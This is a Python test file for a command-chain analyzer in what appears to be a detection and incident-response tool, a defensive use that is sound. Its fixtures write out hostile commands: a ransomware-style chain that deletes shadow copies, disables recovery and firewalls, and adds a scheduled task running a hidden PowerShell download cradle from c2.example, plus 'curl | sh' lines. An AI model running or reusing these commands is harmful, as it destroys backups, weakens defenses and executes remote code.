"""
DIE · Chain Analyzer tests (Phase B.2 · 2026-02-16 pm)
Direct response to the "attacker chain of commandlines collapses
into one flat verdict" complaint. Every real IR-style chain input
should now split into ordered per-step records with intent
classification, DKP enrichment, and aggregate + per-step MITRE.
"""
from services.die.api import analyze
from services.die.chain import (
    _split_quoted_aware, looks_like_chain, analyze_chain, classify_intent,
    _unwrap_nested,
)


# ── quote-aware splitter ──────────────────────────────────────────
def test_split_amp_separator():
    parts = _split_quoted_aware("whoami & hostname & ipconfig")
    assert parts == ["whoami", "hostname", "ipconfig"]

def test_split_and_and_beats_amp():
    parts = _split_quoted_aware("vssadmin delete && wbadmin delete")
    assert parts == ["vssadmin delete", "wbadmin delete"]

def test_split_semicolon_ps():
    parts = _split_quoted_aware("Get-Process; Stop-Service Spooler; whoami")
    assert parts == ["Get-Process", "Stop-Service Spooler", "whoami"]

def test_split_newlines():
    src = "whoami\nhostname\nipconfig /all\nwhoami & hostname"
    # Newlines are now SOFT separators — they split only when a hard
    # separator (`&`, `;`, `&&`, `||`) is also present in the input.
    parts = _split_quoted_aware(src)
    assert parts == ["whoami", "hostname", "ipconfig /all", "whoami", "hostname"]

def test_split_multiline_without_hard_separator_stays_together():
    """A coherent multi-line Python script (no ``&``/``;``/`&&`/`||`)
    must NOT be shredded into per-line steps — DKP needs the whole
    script to match against."""
    src = "import base64\nexec(base64.b64decode('YQ=='))"
    parts = _split_quoted_aware(src)
    assert len(parts) == 1

def test_split_respects_quotes():
    """Do NOT split inside a quoted string."""
    src = 'net group "Domain Admins" /domain & whoami'
    parts = _split_quoted_aware(src)
    assert parts == ['net group "Domain Admins" /domain', "whoami"]

def test_split_respects_parens():
    """Do NOT split inside a parenthesised subshell."""
    src = "IEX((New-Object Net.WebClient).DownloadString('http://x/y')) ; whoami"
    parts = _split_quoted_aware(src)
    assert len(parts) == 2
    assert "IEX((New-Object" in parts[0]
    assert parts[1] == "whoami"

def test_split_strips_rem_comments():
    src = "rem this is a comment\nwhoami"
    parts = _split_quoted_aware(src)
    assert parts == ["whoami"]

def test_split_returns_single_for_flat_input():
    assert _split_quoted_aware("Get-Process") == ["Get-Process"]

def test_looks_like_chain_multiline_without_separator_false():
    # Multi-line Python script (no shell separator) → not a chain.
    assert looks_like_chain("import x\nx.run()") is False

def test_looks_like_chain_multiline_with_separator_true():
    assert looks_like_chain("whoami\nhostname & ipconfig") is True

def test_looks_like_chain_single_command_false():
    assert looks_like_chain("Get-Process") is False


# ── analyze() auto-dispatch to chain analyzer ─────────────────────
def test_talos_style_ransomware_chain():
    """The real Talos-style chain the user reported.  Each step
    must be recognised individually and DKP must fire at least on
    shadow-copy removal AND schtasks persistence."""
    chain = (
        'whoami & hostname & ipconfig /all '
        '& net user & net group "Domain Admins" /domain '
        '& vssadmin delete shadows /all /quiet '
        '& wbadmin delete catalog -quiet '
        '& bcdedit /set {default} recoveryenabled No '
        '& netsh advfirewall set allprofiles state off '
        '& schtasks /create /tn Updater /tr "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\'http://c2.example/x\')" /sc onlogon /rl HIGHEST'
    )
    env = analyze(chain)
    assert env["chain"] is not None
    assert env["chain"]["step_count"] >= 9

    # Step-level DKP: shadow_copy_removal + schtasks_persistence.
    ids = {m["id"] for m in env["dkp_matches"]}
    assert "dkp.shadow_copy_removal" in ids
    assert "dkp.schtasks_persistence" in ids

    # Intent transitions — Discovery must appear before Impact/Persistence.
    intents = [s["intent"] for s in env["chain"]["steps"]]
    assert "Discovery" in intents
    assert any(i in intents for i in ("Impact", "Persistence"))

    # Nested payload unwrap — the schtasks step embeds a PS payload;
    # we should see a `.1` child step for it.
    child_indices = [s["index"] for s in env["chain"]["steps"]
                     if isinstance(s["index"], str) and s["index"].endswith(".1")]
    assert child_indices, "nested-shell payload should be unwrapped"


def test_chain_narrative_bullets_ordered():
    env = analyze("whoami & vssadmin delete shadows /all /quiet & schtasks /create /tn X /tr y.exe /sc onlogon")
    bullets = env["chain"]["narrative_bullets"]
    assert len(bullets) == 3
    assert bullets[0].startswith("Step 1")
    assert bullets[1].startswith("Step 2")
    assert bullets[2].startswith("Step 3")


def test_chain_aggregate_union():
    env = analyze("whoami & vssadmin delete shadows /all /quiet & wbadmin delete catalog -quiet")
    agg = env["chain"]["aggregate"]
    ids = {t["id"] for t in agg["techniques"]}
    assert "T1490" in ids  # from vssadmin/wbadmin


def test_chain_deterministic():
    src = "whoami & hostname & vssadmin delete shadows /all /quiet"
    a = analyze(src)
    b = analyze(src)
    assert a["chain"]["narrative_bullets"] == b["chain"]["narrative_bullets"]
    assert [s["intent"] for s in a["chain"]["steps"]] == \
           [s["intent"] for s in b["chain"]["steps"]]


def test_single_step_input_no_chain_key():
    """Flat, single-command input should preserve the pre-chain shape
    so existing consumers don't need to branch on `chain`."""
    env = analyze("Get-Process")
    assert env.get("chain") is None


# ── nested-shell unwrap ───────────────────────────────────────────
def test_unwrap_powershell_c():
    got = _unwrap_nested('powershell.exe -w hidden -c "IEX((New-Object Net.WebClient).DownloadString(\'http://x\'))"')
    assert got is not None
    host, payload = got
    assert host == "powershell"
    assert payload.startswith("IEX((New-Object")

def test_unwrap_cmd_slash_c():
    got = _unwrap_nested('cmd /c "whoami & hostname"')
    assert got is not None
    host, payload = got
    assert host == "cmd"
    assert payload == "whoami & hostname"

def test_unwrap_bash_dash_c():
    got = _unwrap_nested("bash -c 'curl http://x | sh'")
    assert got is not None
    host, payload = got
    assert host == "bash"
    assert "curl http://x" in payload


# ── intent classifier ─────────────────────────────────────────────
def test_classify_intent_from_mitre():
    env = {"techniques": [{"id": "T1490", "name": ""}]}
    assert classify_intent(env, "irrelevant") == "Impact"

def test_classify_intent_lexical_fallback():
    env = {"techniques": []}
    assert classify_intent(env, "whoami") == "Discovery"
    assert classify_intent(env, "netsh advfirewall set allprofiles state off") == "Impair Defenses"


# ── nested-shell recursive analysis ───────────────────────────────
def test_nested_payload_gets_its_own_dkp_match():
    """A PS download-cradle placed inside `cmd /c "..."` should still
    surface as a DKP match at the child-step level."""
    src = 'cmd /c "IEX((New-Object Net.WebClient).DownloadString(\'http://x\'))"'
    env = analyze(src)
    # This is chain-eligible only if the outer input has separators
    # already OR the nested payload is recognised.  Force a chain by
    # adding one benign step.
    src2 = "whoami & " + src
    env2 = analyze(src2)
    assert env2["chain"]["step_count"] >= 2
    dkp_ids = {m["id"] for m in env2["dkp_matches"]}
    assert "dkp.ps_download_cradle" in dkp_ids
